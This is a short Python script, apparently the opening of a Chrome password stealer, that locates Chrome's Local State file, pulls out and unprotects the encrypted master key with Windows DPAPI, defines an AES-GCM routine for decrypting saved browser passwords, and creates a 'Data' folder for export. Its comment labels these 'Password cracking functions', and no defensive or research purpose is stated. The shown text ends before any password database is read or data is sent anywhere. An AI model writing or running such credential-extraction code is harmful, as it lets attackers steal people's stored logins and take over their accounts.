import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import datetime
from datetime import date
from pathlib import Path

# Password cracking functions
def humanTime(timestamp):
    epoch_start = datetime.datetime(1601,1,1)
    delta = datetime.timedelta(microseconds=int(timestamp))
    return epoch_start + delta

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    decoded_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    return decoded_key
def decrypt_password(password, key):
    init_vector = password[3:15]
    password = password[15:]
    cipher = AES.new(key, AES.MODE_GCM, init_vector)
    return cipher.decrypt(password)[:-16].decode()

key = get_encryption_key()

# Date and time
today = date.today()

# Spawn folder for Excel
if Path("Data").exists():
    pass
else:
    os.mkdir("Data")
    print("[+] Export destination created: (\"Data\")" )
